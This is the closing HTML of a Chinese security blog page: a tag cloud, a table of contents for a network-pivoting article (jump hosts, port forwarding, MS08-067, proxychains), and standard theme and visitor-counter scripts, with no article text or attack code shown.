href="/tags/vulhub/" rel="tag">vulhub</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/weblogic-T3-JNDI-RMI/" rel="tag">weblogic,T3,JNDI,RMI</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/weblogic-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E8%B0%83%E8%AF%95-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E-%E7%B3%BB%E5%88%97%E6%80%BB%E7%BB%93/" rel="tag">weblogic,基础知识,漏洞分析,调试,历史漏洞,系列总结</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/weblogic-%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2-%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95/" rel="tag">weblogic,环境部署,远程调试</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/weblogic-%E8%A1%A5%E4%B8%81%E5%88%86%E6%9E%90-%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">weblogic,补丁分析,序列化与反序列化</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%85%A8%E5%9B%BD%E5%93%80%E6%82%BC%E6%97%A5/" rel="tag">全国哀悼日</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%85%A8%E9%9D%A2%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/" rel="tag">全面大学生信息安全竞赛</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%AF%E4%BF%A1%E8%AE%A1%E7%AE%97/" rel="tag">可信计算</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/" rel="tag">容器逃逸</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B7%A5%E5%85%B7%E5%88%A9%E5%99%A8/" rel="tag">工具利器</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%80%9D%E6%83%B3%E7%BB%93%E6%99%B6/" rel="tag">思想结晶</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8A%80%E6%9C%AF%E5%9F%BA%E7%A1%80/" rel="tag">技术基础</a><span class="tag-list-count">10</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%B0%E5%86%A0%E8%82%BA%E7%82%8E/" rel="tag">新冠肺炎</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%A1%86%E6%9E%B6%E5%9F%BA%E7%A1%80/" rel="tag">框架基础</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%85%E6%98%8E%E8%8A%82/" rel="tag">清明节</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BA%90%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">源代码审计</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag">漏洞复现</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" rel="tag">漏洞挖掘</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/" rel="tag">环境部署</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AA%81%E7%A0%B4%E5%8F%A3/" rel="tag">突破口</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E7%AB%99%E5%85%B3%E9%94%AE%E5%AD%97-%E5%8F%8D%E5%BC%B9shell/" rel="tag">网站关键字,反弹shell</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E7%A9%BF%E9%80%8F/" rel="tag">网络穿透</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%80%8F%E8%A7%86%E6%94%BB%E5%87%BB/" rel="tag">透视攻击</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E6%88%98/" rel="tag">靶机实战</a><span class="tag-list-count">1</span></li></ul>
+	        </canvas>
+	    </div>
+	</div>
+	
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel-active">
+          <div class="post-toc-indicator-top post-toc-indicator"></div>
+          <div class="post-toc">
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#何谓路由"><span class="nav-text">何谓路由</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#何谓Pivoting"><span class="nav-text">何谓Pivoting</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#拿下第一层双网卡中转跳板及端口转发"><span class="nav-text">拿下第一层双网卡中转跳板及端口转发</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#通过中转跳板进行Nmap扫描"><span class="nav-text">通过中转跳板进行Nmap扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#端口转发"><span class="nav-text">端口转发</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#通过中转跳板进行SSH暴力破解"><span class="nav-text">通过中转跳板进行SSH暴力破解</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#获取第二层中转跳板的访问"><span class="nav-text">获取第二层中转跳板的访问</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#MS08-067搭配Bind-TCP"><span class="nav-text">MS08-067搭配Bind TCP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Easy-File-Share应用的BoF漏洞"><span class="nav-text">Easy File Share应用的BoF漏洞</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#两层层中转跳板"><span class="nav-text">两层层中转跳板</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#神器Proxychains"><span class="nav-text">神器Proxychains</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-text">总结</span></a></li></ol></div>
+            
+          </div>
+          <div class="post-toc-indicator-bottom post-toc-indicator"></div>
+        </section>
+      
+    </div>
+  </aside>
+
+
+        
+
+
+
+
+
+<script type="text/javascript" src="//cdn.jsdelivr.net/gh/theme-next/theme-next-three@latest/three-waves.min.js"></script>
+
+
+	  </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner"> <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="icon-next-heart fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">FunctFan</span>
+</div>
+
+<div class="powered-by">
+  由 <a class="theme-link" href="http://hexo.io" target="_blank" rel="noopener">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="#">
+    FreeSky
+  </a>(Reserved)
+
+  
+  <span id="busuanzi_container_site_uv">
+     &nbsp; | &nbsp;  用户量: <span id="busuanzi_value_site_uv"></span>
+  </span>
+  <span id="busuanzi_container_site_pv">
+    &nbsp; | &nbsp;  总访问量: <span id="busuanzi_value_site_pv"></span>
+  </span>
+
+  
+</div>
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+ </div>
+    </footer>
+
+    <div class="back-to-top"></div>
+  </div>
+
+  <script type="text/javascript" src="/others/jquery/index.js?v=2.1.3"></script>
+
+  
+  
+  
+    
+    
+
+  
+
+
+  
+  
+  <script type="text/javascript" src="/others/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript" src="/js/fancy-box.js?v=0.4.5.2"></script>
+
+
+  <script type="text/javascript" src="/js/helpers.js?v=0.4.5.2"></script>
+  
+
+  <script type="text/javascript" src="/others/velocity/velocity.min.js"></script>
+  <script type="text/javascript" src="/others/velocity/velocity.ui.min.js"></script>
+
+  <script type="text/javascript" src="/js/motion_global.js?v=0.4.5.2" id="motion.global"></script>
+
+
+
+
+  <script type="text/javascript" src="/js/nav-toggle.js?v=0.4.5.2"></script>
+  <script type="text/javascript" src="/others/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  
+<script type="text/javascript" src="/js/bootstrap.scrollspy.js?v=0.4.5.2" id="bootstrap.scrollspy.custom"></script>
+
+
+<script type="text/javascript" id="sidebar.toc.highlight">
+  $(document).ready(function () {
+    var tocSelector = '.post-toc';
+    var $tocSelector = $(tocSelector);
+    var activeCurrentSelector = '.active-current';
+
+    $tocSelector
+      .on('activate.bs.scrollspy', function () {
+        var $currentActiveElement = $(tocSelector + ' .active').last();
+
+        removeCurrentActiveClass();
+        $currentActiveElement.addClass('active-current');
+
+        $tocSelector[0].scrollTop = $currentActiveElement.position().top;
+      })
+      .on('clear.bs.scrollspy', function () {
+        removeCurrentActiveClass();
+      });
+
+    function removeCurrentActiveClass () {
+      $(tocSelector + ' ' + activeCurrentSelector)
+        .removeClass(activeCurrentSelector.substring(1));
+    }
+
+    function processTOC () {
+      getTOCMaxHeight();
+      toggleTOCOverflowIndicators();
+    }
+
+    function getTOCMaxHeight () {
+      var height = $('.sidebar').height() -
+                   $tocSelector.position().top -
+                   $('.post-toc-indicator-bottom').height();
+
+      $tocSelector.css('height', height);
+
+      return height;
+    }
+
+    function toggleTOCOverflowIndicators () {
+      tocOverflowIndicator(
+        '.post-toc-indicator-top',
+        $tocSelector.scrollTop() > 0 ? 'show' : 'hide'
+      );
+
+      tocOverflowIndicator(
+        '.post-toc-indicator-bottom',
+        $tocSelector.scrollTop() >= $tocSelector.find('ol').height() - $tocSelector.height() ? 'hide' : 'show'
+      )
+    }
+
+    $(document).on('sidebar.motion.complete', function () {
+      processTOC();
+    });
+
+    $('body').scrollspy({ target: tocSelector });
+    $(window).on('resize', function () {
+      if ( $('.sidebar').hasClass('sidebar-active') ) {
+        processTOC();
+      }
+    });
+
+    onScroll($tocSelector);
+
+    function onScroll (element) {
+      element.on('mousewheel DOMMouseScroll', function (event) {
+          var oe = event.originalEvent;
+          var delta = oe.wheelDelta || -oe.detail;
+
+          this.scrollTop += ( delta < 0 ? 1 : -1 ) * 30;
+          event.preventDefault();
+
+          toggleTOCOverflowIndicators();
+      });
+    }
+
+    function tocOverflowIndicator (indicator, action) {
+      var $indicator = $(indicator);
+      var opacity = action === 'show' ? 0.4 : 0;
+      $indicator.velocity ?
+        $indicator.velocity('stop').velocity({
+          opacity: opacity
+        }, { duration: 100 }) :
+        $indicator.stop().animate({
+          opacity: opacity
+        }, 100);
+    }
+
+  });
+</script>
+
+<script type="text/javascript" id="sidebar.nav">
+  $(document).ready(function () {
+    var html = $('html');
+    var TAB_ANIMATE_DURATION = 200;
+    var hasVelocity = $.isFunction(html.velocity);
+
+    $('.sidebar-nav li').on('click', function () {
+      var item = $(this);
+      var activeTabClassName = 'sidebar-nav-active';
+      var activePanelClassName = 'sidebar-panel-active';
+      if (item.hasClass(activeTabClassName)) {
+        return;
+      }
+
+      var currentTarget = $('.' + activePanelClassName);
+      var target = $('.' + item.data('target'));
+
+      hasVelocity ?
+        currentTarget.velocity('transition.slideUpOut', TAB_ANIMATE_DURATION, function () {
+          target
+            .velocity('stop')
+            .velocity('transition.slideDownIn', TAB_ANIMATE_DURATION)
+            .addClass(activePanelClassName);
+        }) :
+        currentTarget.animate({ opacity: 0 }, TAB_ANIMATE_DURATION, function () {
+          currentTarget.hide();
+          target
+            .stop()
+            .css({'opacity': 0, 'display': 'block'})
+            .animate({ opacity: 1 }, TAB_ANIMATE_DURATION, function () {
+              currentTarget.removeClass(activePanelClassName);
+              target.addClass(activePanelClassName);
+            });
+        });
+
+      item.siblings().removeClass(activeTabClassName);
+      item.addClass(activeTabClassName);
+    });
+
+    $('.post-toc a').on('click', function (e) {
+      e.preventDefault();
+      var targetSelector = escapeSelector(this.getAttribute('href'));
+      var offset = $(targetSelector).offset().top;
+      hasVelocity ?
+        html.velocity('stop').velocity('scroll', {
+          offset: offset  + 'px',
+          mobileHA: false
+        }) :
+        $('html, body').stop().animate({
+          scrollTop: offset
+        }, 500);
+    });
+
+    // Expand sidebar on post detail page by default, when post has a toc.
+    var $tocContent = $('.post-toc-content');
+    var $aboutContent = $('#posts-about');
+    if (isDesktop() && CONFIG.sidebar === 'post') {
+      if ($tocContent.length > 0 && $tocContent.html().trim().length > 0 && $aboutContent.length === 0) {
+        displaySidebar();
+      }
+    }
+  });
+</script>
+
+
+
+  <script type="text/javascript">
+    $(document).ready(function () {
+      if (CONFIG.sidebar === 'always') {
+        displaySidebar();
+      }
+      if (isMobile()) {
+        FastClick.attach(document.body);
+      }
+
+      motionIntegrator.bootstrap();
+    });
+  </script>
+
+  
+  
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+      processEscapes: true,
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for (i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="http://cdn.bootcss.com/mathjax/2.7.0/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+
+  
+  
+
+  
+
+
+
+
+  <script async src="/js/cursor/fireworks.js"></script>
+
+
+<!--彩带2.自动飘动-->
+
+    <!-- <script src="https://g.joyinshare.com/hc/piao.js" type="text/javascript"></script> -->
+    <script type="text/javascript" src="/js/ribbon_flow.js"></script>
+
+
+
+
+
+
+
+
+
+  <style>
+    .copy-btn {
+      display: inline-block;
+      padding: 6px 12px;
+      font-size: 13px;
+      font-weight: 700;
+      line-height: 20px;
+      color: #333;
+      white-space: nowrap;
+      vertical-align: middle;
+      cursor: pointer;
+      background-color: #eee;
+      background-image: linear-gradient(#fcfcfc, #eee);
+      border: 1px solid #d5d5d5;
+      border-radius: 3px;
+      user-select: none;
+      outline: 0;
+    }
+
+    .highlight-wrap .copy-btn {
+      transition: opacity .3s ease-in-out;
+      opacity: 0;
+      padding: 2px 6px;
+      position: absolute;
+      right: 4px;
+      top: 8px;
+    }
+
+    .highlight-wrap:hover .copy-btn,
+    .highlight-wrap .copy-btn:focus {
+      opacity: 1
+    }
+
+    .highlight-wrap {
+      position: relative;
+    }
+  </style>
+  
+  <script>
+    $('.highlight').each(function (i, e) {
+      var $wrap = $('<div>').addClass('highlight-wrap')
+      $(e).after($wrap)
+      $wrap.append($('<button>').addClass('copy-btn').append('复制').on('click', function (e) {
+        var code = $(this).parent().find('.code').find('.line').map(function (i, e) {
+          return $(e).text()
+        }).toArray().join('\n')
+        var ta = document.createElement('textarea')
+        document.body.appendChild(ta)
+        ta.style.position = 'absolute'
+        ta.style.top = '0px'
+        ta.style.left = '0px'
+        ta.value = code
+        ta.select()
+        ta.focus()
+        var result = document.execCommand('copy')
+        document.body.removeChild(ta)
+        
+          if(result)$(this).text('复制成功')
+          else $(this).text('复制失败')
+        
+        $(this).blur()
+      })).on('mouseleave', function (e) {
+        var $b = $(this).find('.copy-btn')
+        setTimeout(function () {
+          $b.text('复制')
+        }, 300)
+      }).append(e)
+    })
+  </script>
+
+
+
+
+  
+  <script type="text/javascript" src="/js/lazyload.js"></script>
+  <script type="text/javascript">
+    $(function () {
+      $("#posts").find('img').lazyload({
+        placeholder: "/images/loading.gif",
+        effect: "fadeIn"
+      });
+    });
+  </script>
+  
+     <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
+<script>AV.initialize("VmAcWiBwF1SdavvjD8vkHJLn-gzGzoHsz", "cmuscA82gXyC9N1tgjH1m8bK");</script>
+<script>
+function showTime(Counter) {
+  var query = new AV.Query(Counter);
+  $(".leancloud_visitors").each(function() {
+    var url = $(this).attr("id").trim();
+    query.equalTo("url", url);
+    query.find({
+      success: function(results) {
+        if (results.length == 0) {
+          var content = $(document.getElementById(url)).text() + ': 0';
+          $(document.getElementById(url)).text(content);
+          return;
+        }
+        for (var i = 0; i < results.length; i++) {
+          var object = results[i];
+          var content = $(document.getElementById(url)).text() + ': ' + object.get('time');
+          $(document.getElementById(url)).text(content);
+        }
+      },
+      error: function(object, error) {
+        console.log("Error: " + error.code + " " + error.message);
+      }
+    });
+
+  });
+}
+
+function addCount(Counter) {
+  var Counter = AV.Object.extend("Counter");
+  url = $(".leancloud_visitors").attr('id').trim();
+  title = $(".leancloud_visitors").attr('data-flag-title').trim();
+  var query = new AV.Query(Counter);
+  query.equalTo("url", url);
+  query.find({
+    success: function(results) {
+      if (results.length > 0) {
+        var counter = results[0];
+        counter.fetchWhenSave(true);
+        counter.increment("time");
+        counter.save(null, {
+          success: function(counter) {
+            var content = $(document.getElementById(url)).text() + ': ' + counter.get('time');
+            $(document.getElementById(url)).text(content);
+          },
+          error: function(counter, error) {
+            console.log('Failed to save Visitor num, with error message: ' + error.message);
+          }
+        });
+      } else {
+        var newcounter = new Counter();
+        newcounter.set("title", title);
+        newcounter.set("url", url);
+        newcounter.set("time", 1);
+        newcounter.save(null, {
+          success: function(newcounter) {
+              console.log("newcounter.get('time')="+newcounter.get('time'));
+            var content = $(document.getElementById(url)).text() + ': ' + newcounter.get('time');
+            $(document.getElementById(url)).text(content);
+          },
+          error: function(newcounter, error) {
+            console.log('Failed to create');
+          }
+        });
+      }
+    },
+    error: function(error) {
+      console.log('Error:' + error.code + " " + error.message);
+    }
+  });
+}
+$(function() {
+  var Counter = AV.Object.extend("Counter");
+  if ($('.leancloud_visitors').length == 1) {
+    addCount(Counter);
+  } else if ($('.post-title-link').length > 1) {
+    showTime(Counter);
+  }
+}); 
+</script>
+  
+
+
+</body>
+</html>
